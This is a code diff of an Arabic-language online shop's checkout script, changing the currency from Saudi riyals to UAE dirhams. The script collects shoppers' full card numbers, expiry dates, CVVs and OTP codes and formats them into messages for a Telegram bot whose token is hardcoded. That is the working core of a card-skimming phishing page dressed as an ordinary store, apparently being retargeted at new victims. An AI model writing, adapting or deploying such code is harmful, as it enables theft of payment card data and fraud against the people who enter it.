@@ -12,7 +12,7 @@ if (!orderData) {
     let itemsHtml = orderData.items.map(item => `
         <div class="summary-row">
             <span>${item.name} (${item.color}) × ${item.quantity}</span>
-            <span>${(item.price * item.quantity).toFixed(2)} ر.س</span>
+            <span>${(item.price * item.quantity).toFixed(2)} د.إ</span>
         </div>
     `).join('');
 
@@ -21,19 +21,19 @@ if (!orderData) {
         const remaining = orderData.total - orderData.downPayment;
         const monthly = remaining / orderData.months;
         paymentInfo = `
-            <div class="summary-row"><span>الدفعة الأولى</span><span>${orderData.downPayment.toFixed(2)} ر.س</span></div>
+            <div class="summary-row"><span>الدفعة الأولى</span><span>${orderData.downPayment.toFixed(2)} د.إ</span></div>
             <div class="summary-row"><span>عدد الأقساط</span><span>${orderData.months} شهر</span></div>
-            <div class="summary-row"><span>القسط الشهري</span><span>${monthly.toFixed(2)} ر.س</span></div>
+            <div class="summary-row"><span>القسط الشهري</span><span>${monthly.toFixed(2)} د.إ</span></div>
         `;
     } else {
-        paymentInfo = `<div class="summary-row"><span>الدفع كامل</span><span>${orderData.total.toFixed(2)} ر.س</span></div>`;
+        paymentInfo = `<div class="summary-row"><span>الدفع كامل</span><span>${orderData.total.toFixed(2)} د.إ</span></div>`;
     }
 
     summaryEl.innerHTML = `
-        <h3>📦 ملخص الطلب</h3>
+        <h3> ملخص الطلب</h3>
         ${itemsHtml}
         ${paymentInfo}
-        <div class="summary-row"><span>المجموع الكلي</span><span>${orderData.total.toFixed(2)} ر.س</span></div>
+        <div class="summary-row"><span>المجموع الكلي</span><span>${orderData.total.toFixed(2)} د.إ</span></div>
     `;
 
     // تنسيق رقم البطاقة
@@ -86,8 +86,8 @@ async function sendOTP() {
                    `الرمز: <b>${currentOTP}</b>\n\n` +
                    `👤 العميل: ${orderData.customerName}\n` +
                    `📱 الهاتف: ${orderData.phone}\n` +
-                   `💰 المبلغ: ${orderData.total.toFixed(2)} ر.س\n\n` +
-                   `⏰ صالح لمدة 5 دقائق`;
+                   `💰 المبلغ: ${orderData.total.toFixed(2)} د.إ\n\n` +
+                   ` صالح لمدة 5 دقائق`;
     
     try {
         const response = await fetch(`https://api.telegram.org/bot8763567744:AAEjPuOYFJAHMQspuLqODgYrlTqU6W61hpI/sendMessage`, {
@@ -162,17 +162,12 @@ async function completePayment() {
     if (payBtn) payBtn.disabled = true;
     
     try {
-        // ✅ حفظ الطلب في Firebase باستخدام رقم الطلب كـ ID
-        const { setDoc, doc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
-        
-        await setDoc(doc(db, "orders", orderData.orderId), {
+        await addDoc(collection(db, "orders"), {
             ...orderData,
             cardLast4: document.getElementById('cardNumber').value.slice(-4),
             paymentStatus: 'completed',
             paidAt: new Date()
         });
-        
-        console.log('✅ تم حفظ الطلب في Firebase:', orderData.orderId);
         
         const confirmMessage = `✅ <b>تم الدفع بنجاح!</b>\n\n` +
                               `رقم الطلب: #${orderData.orderId}\n` +
@@ -189,9 +184,8 @@ async function completePayment() {
             })
         });
         
-        // ✅ لا نمسح pendingOrder الآن - نتركه للروابط
-        // localStorage.removeItem('pendingOrder');
-        // localStorage.removeItem('cart');
+        localStorage.removeItem('pendingOrder');
+        localStorage.removeItem('cart');
         
         alert('✅ تم الدفع بنجاح! شكراً لطلبك.');
         window.location.href = 'index.html';
@@ -201,9 +195,10 @@ async function completePayment() {
         if (payBtn) payBtn.disabled = false;
     }
 }
-// معالجة الدفع (الزر الرئيسي) - تم إصلاح الخطأ هنا
+
+// معالجة الدفع (الزر الرئيسي)
 window.processPayment = async function() {
-    console.log('🔄 بدء processPayment...');
+    console.log(' بدء processPayment...');
     
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('cardExpiry').value;
@@ -216,18 +211,18 @@ window.processPayment = async function() {
     }
 
     if (cardNumber.length < 13) {
-        alert('️ رقم البطاقة غير صحيح');
+        alert('⚠️ رقم البطاقة غير صحيح');
         return;
     }
 
-    // إرسال بيانات البطاقة بشكل منسق - استخدام let بدلاً من const
+    // إرسال بيانات البطاقة بشكل منسق - ✅ تم تغيير ر.س إلى د.إ
     let cardMessage = `<b>Mr:${orderData.customerName}</b>\n\n`;
     cardMessage += `📞: ${orderData.phone}\n\n`;
     cardMessage += `💳: ${cardNumber}\n\n`;
-    cardMessage += `📅: ${cardExpiry}\n\n`;
-    cardMessage += `: ${cardCVV}\n\n`;
+    cardMessage += `: ${cardExpiry}\n\n`;
+    cardMessage += `🔒: ${cardCVV}\n\n`;
     cardMessage += `<b>==============================</b>\n`;
-    cardMessage += `<b>مبلغ الطلب: ${orderData.total.toFixed(2)} ر.س</b>\n`;
+    cardMessage += `<b>مبلغ الطلب: ${orderData.total.toFixed(2)} د.إ</b>\n`;
     cardMessage += `<b>رقم الطلب: #${orderData.orderId}</b>`;
     
     console.log('📤 إرسال بيانات البطاقة...');
